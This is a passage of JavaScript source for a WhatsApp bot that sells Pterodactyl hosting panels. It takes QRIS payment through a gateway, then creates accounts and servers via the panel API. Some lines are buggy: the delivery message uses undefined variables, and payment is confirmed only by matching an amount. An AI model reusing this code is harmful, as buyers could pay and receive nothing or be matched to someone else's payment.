await fs.writeFileSync("./database/premium.json", JSON.stringify(premium, null, 2))
m.reply(`Berhasil menghapus premium ✅`)
}
break

case "buypanel": {
if (m.isGroup) return m.reply("Pembelian panel pterodactyl hanya bisa di dalam private chat")
if (db.users[m.sender].status_deposit) return m.reply("Masih ada transaksi yang belum diselesaikan, ketik *.batalbeli* untuk membatalkan transaksi sebelumnya!")
let teks = `
 *#- List ram server yang tersedia*
 
* 1GB
* 2GB
* 3GB
* 4GB
* 5GB
* 6GB
* 7GB
* 8GB
* 10GB
* unlimited

 Contoh penggunaan : *.buypanel* 2gb
`
if (!text) return m.reply(teks)
let Obj = {}
let cmd = text.toLowerCase()
if (cmd == "1gb") {
Obj.ram = "1000"
Obj.disk = "1000"
Obj.cpu = "40"
Obj.harga = "1000"
} else if (cmd == "2gb") {
Obj.ram = "2000"
Obj.disk = "1000"
Obj.cpu = "60"
Obj.harga = "2000"
} else if (cmd == "3gb") {
Obj.ram = "3000"
Obj.disk = "2000"
Obj.cpu = "80"
Obj.harga = "3000"
} else if (cmd == "4gb") {
Obj.ram = "4000"
Obj.disk = "2000"
Obj.cpu = "100"
Obj.harga = "4000"
} else if (cmd == "5gb") {
Obj.ram = "5000"
Obj.disk = "3000"
Obj.cpu = "120"
Obj.harga = "5000"
} else if (cmd == "6gb") {
Obj.ram = "6000"
Obj.disk = "3000"
Obj.cpu = "140"
Obj.harga = "6000"
} else if (cmd == "7gb") {
Obj.ram = "7000"
Obj.disk = "4000"
Obj.cpu = "160"
Obj.harga = "7000"
} else if (cmd == "8gb") {
Obj.ram = "8000"
Obj.disk = "4000"
Obj.cpu = "180"
Obj.harga = "8000"
} else if (cmd == "9gb") {
Obj.ram = "9000"
Obj.disk = "5000"
Obj.cpu = "200"
Obj.harga = "9000"
} else if (cmd == "10gb") {
Obj.ram = "10000"
Obj.disk = "5000"
Obj.cpu = "220"
Obj.harga = "10000"
} else if (cmd == "unli" || cmd == "unlimited") {
Obj.ram = "0"
Obj.disk = "0"
Obj.cpu = "0"
Obj.harga = "11000"
} else return m.reply(teks)

const UrlQr = global.qrisOrderKuota

function generateRandomNumber(min, max) {
    return Math.floor(Math.random() * (max - min + 1)) + min;
}

let amount = Number(Obj.harga) + generateRandomNumber(110, 250)
const get = await axios.get(`https://gateway.elevate.web.id/api/orkut/createpayment?amount=${amount}&codeqr=${UrlQr}`)
const teks3 = `
*▧ INFORMASI PEMBAYARAN*
  
 *• ID :* ${get.data.result.transactionId}
 *• Total Pembayaran :* Rp${await toIDR(get.data.result.amount)}
 *• Barang :* Panel Pterodactyl
 *• Expired :* 5 menit

*Note :* 
Qris pembayaran hanya berlaku dalam 5 menit, jika sudah melewati 5 menit pembayaran dinyatakan tidak valid!
Jika pembayaran berhasil bot akan otomatis mengirim notifikasi status pembayaran kamu.

Ketik *.batalbeli* untuk membatalkan
`
let messQr = await danz.sendMessage(m.chat, {image: {url: get.data.result.qrImageUrl}, caption: teks3}, {quoted: m})
db.users[m.sender].status_deposit = true
db.users[m.sender].saweria = {
mess: messQr, 
chat: m.sender,
idDeposit: get.data.result.transactionId, 
amount: get.data.result.amount.toString(), 
exp: function () {
setTimeout(async () => {
if (db.users[m.sender].status_deposit == true && db.users[m.sender].saweria && db.users[m.sender].saweria.amount) {
await danz.sendMessage(db.users[m.sender].saweria.chat, {text: "QRIS Pembayaran telah expired!"}, {quoted: db.users[m.sender].saweria.mess})
await danz.sendMessage(db.users[m.sender].saweria.chat, { delete: db.users[m.sender].saweria.mess.key })
db.users[m.sender].status_deposit = false
await clearInterval(db.users[m.sender].saweria.exp)
delete db.users[m.sender].saweria
}
}, 300000)
}
}

await db.users[m.sender].saweria.exp()

while (db.users[m.sender].status_deposit == true && db.users[m.sender].saweria && db.users[m.sender].saweria.amount) {
await sleep(15000)
const resultcek = await axios.get(`https://gateway.elevate.web.id/api/orkut/cekstatus?merchant=${global.merchantIdOrderKuota}&keyorkut=${global.apiOrderKuota}`)
const req = await resultcek.data.amount
if (db.users[m.sender].saweria && req == db.users[m.sender].saweria.amount) {
db.users[m.sender].status_deposit = false
await clearInterval(db.users[m.sender].saweria.exp)
await danz.sendMessage(db.users[m.sender].saweria.chat, {text: `
*PEMBAYARAN BERHASIL DITERIMA ✅*

 *• ID :* ${db.users[m.sender].saweria.idDeposit}
 *• Total Pembayaran :* Rp${await toIDR(db.users[m.sender].saweria.amount)}
 *• Barang :* Panel Pterodactyl
 *• Payment :* ${resultcek.data.brand_name}
`}, {quoted: db.users[m.sender].saweria.mess})
let username = crypto.randomBytes(4).toString('hex')
let email = username+"@gmail.com"
let name = capital(username) + " Server"
let password = username+crypto.randomBytes(2).toString('hex')
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username.toLowerCase(),
"first_name": name,
"last_name": "Server",
"language": "en",
"password": password.toString()
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2))
let user = data.attributes
let desc = tanggal(Date.now())
let usr_id = user.id
let f1 = await fetch(domain + `/api/application/nests/${nestid}/eggs/` + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
let data2 = await f1.json();
let startup_cmd = data2.attributes.startup
let f2 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": desc,
"user": usr_id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": Obj.ram,
"swap": 0,
"disk": Obj.disk,
"io": 500,
"cpu": Obj.cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 5
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let result = await f2.json()
if (result.errors) return m.reply(JSON.stringify(result.errors[0], null, 2))
let server = result.attributes
var orang = db.users[m.sender].saweria.chat
var tekspanel = `
> Pesanan anda telah sampai
© DanzBotz V2 - Update 2025
       ​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​
*​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​ *ID Server :* ${server.id}
* *Nama :* ${name}
* *Username :* ${user.username}
* *Password :* ${password}
* *Login :* ${global.domainV2}
* *Ram :* ${ram == "0" ? "Unlimited" : ram.split("").length > 4 ? ram.split("").slice(0,2).join("") + "GB" : ram.charAt(0) + "GB"}
* *Cpu :* ${cpu == "0" ? "Unlimited" : cpu+"%"}
* *Disk :* ${disknya == "0" ? "Unlimited" : disknya.split("").length > 4 ? disknya.split("").slice(0,2).join("") + "GB" : disknya.charAt(0) + "GB"}
* *Expired Server :* 1 Bulan

*Rules Pembelian Panel ⚠️*
* Simpan Data Ini Sebaik Mungkin, Seller Hanya Mengirim 1 Kali!
* Data Hilang/Lupa Akun, Seller Tidak Akan Bertanggung Jawab!
* Garansi Aktif 10 Hari (1x replace)
* Claim Garansi Wajib Membawa Bukti Ss Chat Saat Pembelian
`
await danz.sendMessage(orang, {text: tekspanel}, {quoted: null})
await danz.sendMessage(db.users[m.sender].saweria.chat, { delete: db.users[m.sender].saweria.mess.key })
delete db.users[m.sender].saweria
}
}

}
break

case "buypanel-v2": {
if (m.isGroup) return m.reply("Pembelian panel pterodactyl hanya bisa di dalam private chat")
if (db.users[m.sender].status_deposit) return m.reply("Masih ada transaksi yang belum diselesaikan, ketik *.batalbeli* untuk membatalkan transaksi sebelumnya!")
let teks = `
 *#- List ram server yang tersedia*
 
* 1GB
* 2GB
* 3GB
* 4GB
* 5GB
* 6GB
* 7GB
* 8GB
* 10GB
* unlimited

 Contoh penggunaan : *.buypanel-v2* 2gb
`
if (!text) return m.reply(teks)
let Obj = {}
let cmd = text.toLowerCase()
if (cmd == "1gb") {
Obj.ram = "1000"
Obj.disk = "1000"
Obj.cpu = "40"
Obj.harga = "2000"
} else if (cmd == "2gb") {
Obj.ram = "2000"
Obj.disk = "1000"
Obj.cpu = "60"
Obj.harga = "3000"
} else if (cmd == "3gb") {
Obj.ram = "3000"
Obj.disk = "2000"
Obj.cpu = "80"
Obj.harga = "4000"
} else if (cmd == "4gb") {
Obj.ram = "4000"
Obj.disk = "2000"
Obj.cpu = "100"
Obj.harga = "5000"
} else if (cmd == "5gb") {
Obj.ram = "5000"
Obj.disk = "3000"
Obj.cpu = "120"
Obj.harga = "6000"
} else if (cmd == "6gb") {
Obj.ram = "6000"
Obj.disk = "3000"
Obj.cpu = "140"
Obj.harga = "7000"
} else if (cmd == "7gb") {
Obj.ram = "7000"
Obj.disk = "4000"
Obj.cpu = "160"
Obj.harga = "8000"
} else if (cmd == "8gb") {
Obj.ram = "8000"
Obj.disk = "4000"
Obj.cpu = "180"
Obj.harga = "9000"
} else if (cmd == "9gb") {
Obj.ram = "9000"
Obj.disk = "5000"
Obj.cpu = "200"
Obj.harga = "10000"
} else if (cmd == "10gb") {
Obj.ram = "10000"
Obj.disk = "5000"
Obj.cpu = "220"
Obj.harga = "11000"
} else if (cmd == "unli" || cmd == "unlimited") {
Obj.ram = "0"
Obj.disk = "0"
Obj.cpu = "0"
Obj.harga = "12000"
} else return m.reply(teks)

const UrlQr = global.qrisOrderKuota

function generateRandomNumber(min, max) {
    return Math.floor(Math.random() * (max - min + 1)) + min;
}

let amount = Number(Obj.harga) + generateRandomNumber(110, 250)
const get = await axios.get(`https://gateway.elevate.web.id/api/orkut/createpayment?amount=${amount}&codeqr=${UrlQr}`)
const teks3 = `
*▧ INFORMASI PEMBAYARAN*
  
 *• ID :* ${get.data.result.transactionId}
 *• Total Pembayaran :* Rp${await toIDR(get.data.result.amount)}
 *• Barang :* Panel Pterodactyl
 *• Expired :* 5 menit

*Note :* 
Qris pembayaran hanya berlaku dalam 5 menit, jika sudah melewati 5 menit pembayaran dinyatakan tidak valid!
Jika pembayaran berhasil bot akan otomatis mengirim notifikasi status pembayaran kamu.

Ketik *.batalbeli* untuk membatalkan
`
let messQr = await danz.sendMessage(m.chat, {image: {url: get.data.result.qrImageUrl}, caption: teks3}, {quoted: m})
db.users[m.sender].status_deposit = true
db.users[m.sender].saweria = {
mess: messQr, 
chat: m.sender,
idDeposit: get.data.result.transactionId, 
amount: get.data.result.amount.toString(), 
exp: function () {
setTimeout(async () => {
if (db.users[m.sender].status_deposit == true && db.users[m.sender].saweria && db.users[m.sender].saweria.amount) {
await danz.sendMessage(db.users[m.sender].saweria.chat, {text: "QRIS Pembayaran telah expired!"}, {quoted: db.users[m.sender].saweria.mess})
await danz.sendMessage(db.users[m.sender].saweria.chat, { delete: db.users[m.sender].saweria.mess.key })
db.users[m.sender].status_deposit = false
await clearInterval(db.users[m.sender].saweria.exp)
delete db.users[m.sender].saweria
}
}, 300000)
}
}

await db.users[m.sender].saweria.exp()

while (db.users[m.sender].status_deposit == true && db.users[m.sender].saweria && db.users[m.sender].saweria.amount) {
await sleep(15000)
const resultcek = await axios.get(`https://gateway.elevate.web.id/api/orkut/cekstatus?merchant=${global.merchantIdOrderKuota}&keyorkut=${global.apiOrderKuota}`)
const req = await resultcek.data.amount
if (db.users[m.sender].saweria && req == db.users[m.sender].saweria.amount) {
db.users[m.sender].status_deposit = false
await clearInterval(db.users[m.sender].saweria.exp)
await danz.sendMessage(db.users[m.sender].saweria.chat, {text: `
*PEMBAYARAN BERHASIL DITERIMA ✅*

 *• ID :* ${db.users[m.sender].saweria.idDeposit}
 *• Total Pembayaran :* Rp${await toIDR(db.users[m.sender].saweria.amount)}
 *• Barang :* Panel Pterodactyl
 *• Payment :* ${resultcek.data.brand_name}
`}, {quoted: db.users[m.sender].saweria.mess})
let username = crypto.randomBytes(4).toString('hex')
let email = username+"@gmail.com"
let name = capital(username) + " Server"
let password = username+crypto.randomBytes(2).toString('hex')
let f = await fetch(domainV2 + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyV2
},
"body": JSON.stringify({
"email": email,
"username": username.toLowerCase(),
"first_name": name,
"last_name": "Server",
"language": "en",
"password": password.toString()
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2))
let user = data.attributes
let desc = tanggal(Date.now())
let usr_id = user.id
let f1 = await fetch(domainV2 + `/api/application/nests/${nestid}/eggs/` + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyV2
}
})
let data2 = await f1.json();
let startup_cmd = data2.attributes.startup
let f2 = await fetch(domainV2 + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyV2,
},
"body": JSON.stringify({
"name": name,
"description": desc,
"user": usr_id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": Obj.ram,
"swap": 0,
"disk": Obj.disk,
"io": 500,
"cpu": Obj.cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 5
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let result = await f2.json()
if (result.errors) return m.reply(JSON.stringify(result.errors[0], null, 2))
let server = result.attributes
var orang = db.users[m.sender].saweria.chat
var tekspanel = `
> Pesanan anda telah sampai
© DanzBotz V2 - Update 2025
       ​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​
*​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​ *ID Server :* ${server.id}
* *Nama :* ${name}
* *Username :* ${user.username}
* *Password :* ${password}
* *Login :* ${global.domainV2}
* *Ram :* ${ram == "0" ? "Unlimited" : ram.split("").length > 4 ? ram.split("").slice(0,2).join("") + "GB" : ram.charAt(0) + "GB"}
